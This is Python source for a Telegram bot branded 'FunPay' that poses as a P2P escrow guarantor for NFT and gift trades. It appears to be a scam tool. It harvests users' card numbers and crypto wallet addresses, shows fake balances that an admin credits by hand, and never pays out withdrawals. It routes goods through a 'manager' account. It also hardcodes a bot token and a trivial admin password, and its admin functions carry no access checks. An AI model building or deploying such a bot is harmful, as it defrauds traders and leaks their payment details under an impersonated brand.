import asyncio, json, os, logging, random, string, threading, time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = '8602714405:AAGphGTE3W3S9YhYXwRCMGnbjj8bsA5jTAs'
ADMIN_PASS = '2244'
DB_FILE = 'funpay_db.json'
DEAL_LINK = 'https://t.me/FunPay0TCRbot'
bot = AsyncTeleBot(BOT_TOKEN)
user_states = {}

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
threading.Thread(target=lambda: HTTPServer(('0.0.0.0', int(os.environ.get('PORT',8080))), H).serve_forever(), daemon=True).start()

def load_db():
    return json.load(open(DB_FILE)) if os.path.exists(DB_FILE) else {}

def save_db(data):
    json.dump(data, open(DB_FILE, 'w'), indent=2)

def get_user(uid):
    db = load_db()
    uid = str(uid)
    if uid not in db:
        db[uid] = {'ton':'','card':'','stars':'','usdt':'','btc':'','balance':0.0,'deals':[],'ref_count':0,'ref_earned':0.0,'ref_code':''.join(random.choices(string.digits,k=8)),'lang':'ru','frozen':False,'blocked':False}
        save_db(db)
    return db[uid]

def save_user(uid, data):
    db = load_db()
    db[str(uid)] = data
    save_db(db)

WELCOME = """
🎉 Добро пожаловать в FunPay 🎉

⭐ Ваш надёжный P2P-гарант:
1️⃣ Автоматические сделки с NFT и подарками
2️⃣ Полная защита обеих сторон
3️⃣ Реферальная программа — 50% от комиссии
4️⃣ Передача товаров через менеджера: @SupOTC

👇 Выберите действие ниже
"""

LOGO_URL = 'https://i.ibb.co/S7y8854h/2026-05-09-23-35-40.jpg'

CURRENCY = {'card': '₽', 'stars': '⭐ Stars', 'crypto': '💵 USDT', 'ton': '💎 TON'}

def main_menu(uid):
    kb = [
        [InlineKeyboardButton('📋 Мои реквизиты', callback_data='menu_req'), InlineKeyboardButton('📝 Создать сделку', callback_data='menu_deal')],
        [InlineKeyboardButton('💰 Баланс', callback_data='menu_balance'), InlineKeyboardButton('📚 Мои сделки', callback_data='menu_deals')],
        [InlineKeyboardButton('👥 Рефералы', callback_data='menu_refs'), InlineKeyboardButton('🌐 Язык / Lang', callback_data='menu_lang')],
        [InlineKeyboardButton('📞 Техподдержка', callback_data='menu_support')]
    ]
    return InlineKeyboardMarkup(kb)

def admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('👥 Список юзеров', callback_data='adm_users')],
        [InlineKeyboardButton('❄️ Заморозить', callback_data='adm_freeze'), InlineKeyboardButton('🚫 Заблокировать', callback_data='adm_block')],
        [InlineKeyboardButton('💰 Начислить', callback_data='adm_addmoney')],
        [InlineKeyboardButton('📊 Статистика', callback_data='adm_stats')],
        [InlineKeyboardButton('📝 Управление сделками', callback_data='adm_deals_list')],
        [InlineKeyboardButton('🔙 Выход', callback_data='back_main')]
    ])

@bot.message_handler(commands=['start'])
async def start(msg):
    uid = str(msg.from_user.id)
    await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))

@bot.message_handler(commands=['code'])
async def code_cmd(msg):
    user_states[str(msg.from_user.id)] = {'step': 'admin_auth'}
    await bot.send_message(msg.chat.id, '🔐 Введите пароль администратора:')

@bot.callback_query_handler(func=lambda call: True)
async def callback(call):
    uid = str(call.from_user.id)
    data = call.data
    cid, mid = call.message.chat.id, call.message.message_id
    user = get_user(uid)
    
    try:
        await bot.delete_message(cid, mid)
    except:
        pass
    
    try:
        if data == 'back_main':
            await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        
        elif data == 'menu_req':
            u = get_user(uid)
            text = f"📋 Мои реквизиты\n\n💎 TON-кошелёк: {u['ton'] or '—'}\n💳 Карта: {u['card'] or '—'}\n⭐ Stars: {u['stars'] or '@—'}\n🌐 USDT (TRC20): {u['usdt'] or '—'}\n₿ BTC: {u['btc'] or '—'}"
            kb = [
                [InlineKeyboardButton('💎 TON-кошелёк', callback_data='set_ton'), InlineKeyboardButton('💳 Карта', callback_data='set_card')],
                [InlineKeyboardButton('⭐ @username (Stars)', callback_data='set_stars'), InlineKeyboardButton('🌐 USDT-кошелёк', callback_data='set_usdt')],
                [InlineKeyboardButton('₿ BTC-кошелёк', callback_data='set_btc')],
                [InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]
            ]
            await bot.send_photo(cid, LOGO_URL, caption=text, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data in ['set_ton','set_card','set_stars','set_usdt','set_btc']:
            prompts = {'set_ton': ('💬 Введите новый TON-кошелёк:','setting_ton'),
                       'set_card': ('🔄 Введите номер карты:','setting_card'),
                       'set_stars': ('⭐ Введите @username для Stars (без @):','setting_stars'),
                       'set_usdt': ('🌐 Введите USDT-адрес (TRC20):','setting_usdt'),
                       'set_btc': ('⏱️ Введите BTC-адрес:','setting_btc')}
            prompt, step = prompts[data]
            user_states[uid] = {'step': step}
            await bot.send_message(cid, prompt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_req')]]))
        
        elif data == 'menu_deal':
            kb = [
                [InlineKeyboardButton('✅ Я продавец', callback_data='deal_seller'), InlineKeyboardButton('❌ Я покупатель', callback_data='deal_buyer')],
                [InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]
            ]
            await bot.send_photo(cid, LOGO_URL, caption="📝 Новая сделка\n\n> Кем вы выступаете в этой сделке?\n\n✅ Продавец — вы продаёте товар/услугу и получаете оплату.\n❌ Покупатель — вы платите и получаете товар/услугу.", reply_markup=InlineKeyboardMarkup(kb))
        
        elif data in ['deal_seller', 'deal_buyer']:
            user_states[uid] = {'step': 'deal_role', 'role': data}
            kb = [
                [InlineKeyboardButton('💎 TON', callback_data='pay_ton'), InlineKeyboardButton('⭐ Stars', callback_data='pay_stars')],
                [InlineKeyboardButton('💵 USDT (Крипта)', callback_data='pay_crypto')],
                [InlineKeyboardButton('💳 Карта', callback_data='pay_card')],
                [InlineKeyboardButton('🔙 Назад', callback_data='menu_deal')]
            ]
            text = '1️⃣ Способ получения оплаты:\nКак покупатель переведёт средства?' if data == 'deal_seller' else '1️⃣ Способ оплаты:\nКаким способом вы хотите оплатить?'
            await bot.send_photo(cid, LOGO_URL, caption=text, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data.startswith('pay_'):
            method = data.replace('pay_', '')
            u = get_user(uid)
            if method == 'card' and not u['card']:
                await bot.send_message(cid, '❌ Сначала добавьте данные карты в «Мои реквизиты».')
                await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
                return
            if method == 'stars' and not u['stars']:
                await bot.send_message(cid, '❌ Сначала добавьте Stars в «Мои реквизиты».')
                await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
                return
            if method == 'crypto' and not u['usdt']:
                await bot.send_message(cid, '❌ Сначала добавьте USDT-кошелёк в «Мои реквизиты».')
                await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
                return
            if method == 'ton' and not u['ton']:
                await bot.send_message(cid, '❌ Сначала добавьте TON-кошелёк в «Мои реквизиты».')
                await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
                return
            
            currency_text = {'card': '₽ (карта)', 'stars': '⭐ Stars', 'crypto': '💵 USDT', 'ton': '💎 TON'}
            user_states[uid] = {'step': 'deal_amount', 'method': method, 'role': user_states.get(uid, {}).get('role', 'deal_seller')}
            await bot.send_message(cid, f'Введите сумму сделки ({currency_text[method]}):', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Назад', callback_data='menu_deal')]]))
        
        elif data == 'menu_balance':
            u = get_user(uid)
            completed = sum(1 for d in u['deals'] if d.get('status') == 'completed')
            if completed < 3:
                text = f"💰 Баланс\n\n💵 Ваш баланс: {u['balance']} TON\n📈 Завершённых сделок: {completed}\n❗ Для вывода средств необходимо минимум 3 завершённых сделки"
            else:
                text = f"💰 Баланс\n\n💵 Ваш баланс: {u['balance']} TON\n📈 Завершённых сделок: {completed}\n✅ Вывод средств доступен"
            kb = [
                [InlineKeyboardButton('💸 Вывод средств', callback_data='withdraw'), InlineKeyboardButton('📋 Транзакции', callback_data='transactions')],
                [InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]
            ]
            await bot.send_photo(cid, LOGO_URL, caption=text, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data == 'menu_deals':
            u = get_user(uid)
            deals = u.get('deals', [])
            if not deals:
                text = '📚 Мои сделки\n\n📝 Всего: 0\n✅ Завершено: 0'
            else:
                text = f"📚 Мои сделки\n\n📝 Всего: {len(deals)}\n✅ Завершено: " + str(sum(1 for d in deals if d.get("status")=="completed")) + "\n\n"
                for i, d in enumerate(deals[-5:], 1):
                    currency = CURRENCY.get(d.get('method','ton'), '💎')
                    status = {'active':'🟡 Активна','completed':'🟢 Завершена','cancelled':'🔴 Отменена'}.get(d.get('status'), '❓')
                    text += f"{i}. {currency} {d['amount']} | {status} | {d['code'][:8]}\n"
            kb = [
                [InlineKeyboardButton('🔍 Поиск по коду', callback_data='search_deal'), InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]
            ]
            await bot.send_photo(cid, LOGO_URL, caption=text, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data == 'search_deal':
            user_states[uid] = {'step': 'search_deal'}
            await bot.send_message(cid, '🔍 Введите код сделки:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_deals')]]))
        
        elif data == 'menu_refs':
            u = get_user(uid)
            text = f"👥 Реферальная программа\n\n🔗 Ваша ссылка: https://t.me/FunPay0TCRbot?start=ref_{u['ref_code']}\n🔒 Рефералов: {u['ref_count']}\n💰 Заработано: {u['ref_earned']} TON\n\n🎁 Бонус: 50% от комиссии с каждой сделки реферала!"
            kb = [
                [InlineKeyboardButton('📋 Скопировать реф. ссылку', callback_data='copy_ref'), InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]
            ]
            await bot.send_photo(cid, LOGO_URL, caption=text, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data == 'copy_ref':
            u = get_user(uid)
            await bot.send_message(cid, f"📋 Ваша реферальная ссылка:\nhttps://t.me/FunPay0TCRbot?start=ref_{u['ref_code']}")
            await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        
        elif data == 'menu_lang':
            await bot.send_photo(cid, LOGO_URL, caption='🌐 Выберите язык:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🇷🇺 Русский', callback_data='lang_ru'), InlineKeyboardButton('🇬🇧 English', callback_data='lang_en')], [InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]]))
        
        elif data in ['lang_ru', 'lang_en']:
            await bot.send_message(cid, '✅ Язык изменён!')
            await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        
        elif data == 'menu_support':
            await bot.send_photo(cid, LOGO_URL, caption='📞 По всем вопросам обращайтесь к менеджеру: @SupOTC', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]]))
        
        elif data == 'withdraw':
            user_states[uid] = {'step': 'withdraw'}
            await bot.send_message(cid, '💸 Введите сумму для вывода (минимум 1 TON):', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_balance')]]))
        
        elif data == 'transactions':
            await bot.send_photo(cid, LOGO_URL, caption='📋 У вас пока нет транзакций.', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_balance')]]))

        # АДМИН-ПАНЕЛЬ
        elif data == 'adm_users':
            db = load_db()
            users = list(db.items())
            text = '👥 Список юзеров:\n\n'
            for uid2, u in users[:10]:
                bal = u.get('balance', 0)
                frozen = '❄️' if u.get('frozen') else ''
                blocked = '🚫' if u.get('blocked') else ''
                text += f"ID:{uid2} {frozen}{blocked} Bal:{bal} TON\n"
            await bot.send_message(cid, text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Назад', callback_data='adm_back')]]))
        
        elif data == 'adm_freeze':
            user_states[uid] = {'step': 'adm_freeze_id'}
            await bot.send_message(cid, '❄️ Введите ID юзера для заморозки:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Назад', callback_data='adm_back')]]))
        elif data == 'adm_block':
            user_states[uid] = {'step': 'adm_block_id'}
            await bot.send_message(cid, '🚫 Введите ID юзера для блокировки:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Назад', callback_data='adm_back')]]))
        elif data == 'adm_addmoney':
            user_states[uid] = {'step': 'adm_addmoney_id'}
            await bot.send_message(cid, '💰 Введите ID юзера для начисления:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Назад', callback_data='adm_back')]]))
        elif data == 'adm_stats':
            db = load_db()
            total = len(db)
            bal = sum(u.get('balance',0) for u in db.values())
            deals = sum(len(u.get('deals',[])) for u in db.values())
            frozen = sum(1 for u in db.values() if u.get('frozen'))
            blocked = sum(1 for u in db.values() if u.get('blocked'))
            text = f"📊 Статистика:\n👥 Юзеров: {total}\n💰 Общий баланс: {bal} TON\n📝 Сделок: {deals}\n❄️ Заморожено: {frozen}\n🚫 Заблокировано: {blocked}"
            await bot.send_message(cid, text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Назад', callback_data='adm_back')]]))
        elif data == 'adm_deals_list':
            db = load_db()
            all_deals = []
            for uid2, u in db.items():
                for d in u.get('deals', []):
                    all_deals.append((uid2, d))
            text = '📝 Все сделки:\n\n'
            for uid2, d in all_deals[-10:]:
                status = d.get('status','?')
                text += f"👤{uid2} | {d['code'][:8]} | {d['amount']} | {status}\n"
            if not all_deals:
                text += 'Нет сделок.'
            kb = [[InlineKeyboardButton('🔄 Обновить статус', callback_data='adm_change_status')], [InlineKeyboardButton('🔙 Назад', callback_data='adm_back')]]
            await bot.send_message(cid, text, reply_markup=InlineKeyboardMarkup(kb))
        elif data == 'adm_change_status':
            user_states[uid] = {'step': 'adm_deal_code'}
            await bot.send_message(cid, '📝 Введите код сделки и новый статус (active/completed/cancelled):\nФормат: КОД СТАТУС')
        elif data == 'adm_back':
            await bot.send_message(cid, '👑 Админ-панель FunPay:', reply_markup=admin_menu())
    
    except Exception as e:
        logger.error(f"Callback error: {e}")

@bot.message_handler(func=lambda m: True)
async def text(msg):
    uid = str(msg.from_user.id)
    state = user_states.get(uid, {})
    step = state.get('step')
    user = get_user(uid)
    
    if step == 'admin_auth':
        if msg.text.strip() == ADMIN_PASS:
            del user_states[uid]
            await bot.send_message(msg.chat.id, '👑 Админ-панель FunPay:', reply_markup=admin_menu())
        else:
            del user_states[uid]
            await bot.send_message(msg.chat.id, '❌ Неверный пароль!')
        return

    if step == 'adm_freeze_id':
        target = msg.text.strip()
        u = get_user(target)
        u['frozen'] = True
        save_user(target, u)
        del user_states[uid]
        await bot.send_message(msg.chat.id, f'✅ Юзер {target} заморожен!', reply_markup=admin_menu())
        return
    if step == 'adm_block_id':
        target = msg.text.strip()
        u = get_user(target)
        u['blocked'] = True
        save_user(target, u)
        del user_states[uid]
        await bot.send_message(msg.chat.id, f'✅ Юзер {target} заблокирован!', reply_markup=admin_menu())
        return
    if step == 'adm_addmoney_id':
        user_states[uid] = {'step': 'adm_addmoney_amount', 'target': msg.text.strip()}
        await bot.send_message(msg.chat.id, '💰 Введите сумму для начисления (TON):')
        return
    if step == 'adm_addmoney_amount':
        try:
            amount = float(msg.text.strip())
            target = state.get('target')
            u = get_user(target)
            u['balance'] = u.get('balance', 0) + amount
            save_user(target, u)
            del user_states[uid]
            await bot.send_message(msg.chat.id, f'✅ Начислено {amount} TON юзеру {target}!', reply_markup=admin_menu())
        except:
            await bot.send_message(msg.chat.id, '❌ Введите число!')
        return
    if step == 'adm_deal_code':
        parts = msg.text.strip().split()
        if len(parts) >= 2:
            code = parts[0]
            new_status = parts[1]
            if new_status not in ['active','completed','cancelled']:
                await bot.send_message(msg.chat.id, '❌ Статус: active, completed или cancelled')
                return
            db = load_db()
            updated = False
            for uid2, u in db.items():
                for d in u.get('deals', []):
                    if d['code'] == code:
                        d['status'] = new_status
                        updated = True
                        break
            save_db(db)
            if updated:
                await bot.send_message(msg.chat.id, f'✅ Статус сделки {code} изменён на {new_status}!', reply_markup=admin_menu())
            else:
                await bot.send_message(msg.chat.id, '❌ Сделка не найдена.')
        else:
            await bot.send_message(msg.chat.id, '❌ Формат: КОД СТАТУС (например: ABC12345 completed)')
        del user_states[uid]
        return
    
    fields = {'setting_ton': ('ton', '💎 TON-кошелёк'), 'setting_card': ('card', '💳 Карта'),
              'setting_stars': ('stars', '⭐ Stars'), 'setting_usdt': ('usdt', '🌐 USDT'), 'setting_btc': ('btc', '₿ BTC')}
    
    if step in fields:
        field, name = fields[step]
        user[field] = msg.text.strip()
        save_user(uid, user)
        del user_states[uid]
        await bot.send_message(msg.chat.id, f'✅ {name} сохранён!')
        await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        return
    
    if step == 'deal_amount':
        try:
            amount = float(msg.text.strip())
            method = state.get('method', 'ton')
            currency = CURRENCY.get(method, '💎 TON')
            deal_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
            deal = {'code': deal_code, 'amount': amount, 'method': method, 'role': state.get('role'), 'status': 'active', 'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            user['deals'].append(deal); save_user(uid, user); del user_states[uid]
            await bot.send_message(msg.chat.id, f"✅ Сделка успешно создана!\n\n💸 Сумма: {amount} {currency}\n📝 Описание: Сделка на {amount} {currency}\n🔗 Ссылка на сделку: {DEAL_LINK}")
        except:
            await bot.send_message(msg.chat.id, '❌ Введите число!')
        return
    
    if step == 'withdraw':
        completed = sum(1 for d in user.get('deals',[]) if d.get('status') == 'completed')
        if completed < 3:
            del user_states[uid]
            await bot.send_message(msg.chat.id, f'❌ У вас всего {completed} завершённых сделок. Вывод доступен после 3 сделок.')
            await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
            return
        del user_states[uid]
        await bot.send_message(msg.chat.id, '✅ Заявка на вывод создана.')
        await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        return
    
    if step == 'search_deal':
        code = msg.text.strip()
        found = next((d for d in user['deals'] if d['code'].startswith(code)), None)
        if found:
            currency = CURRENCY.get(found.get('method','ton'), '💎')
            status = {'active':'🟡 Активна','completed':'🟢 Завершена','cancelled':'🔴 Отменена'}.get(found.get('status'), '❓')
            await bot.send_message(msg.chat.id, f"📝 Сделка {found['code']}\n💰 Сумма: {found['amount']} {currency}\n📅 {found['time']}\n📊 Статус: {status}")
        else:
            await bot.send_message(msg.chat.id, '❌ Сделка не найдена.')
        await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        del user_states[uid]
        return
    
    await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))

async def main():
    logger.info("FunPay бот запущен!")
    await bot.polling(non_stop=True)

if __name__ == '__main__':
    asyncio.run(main())
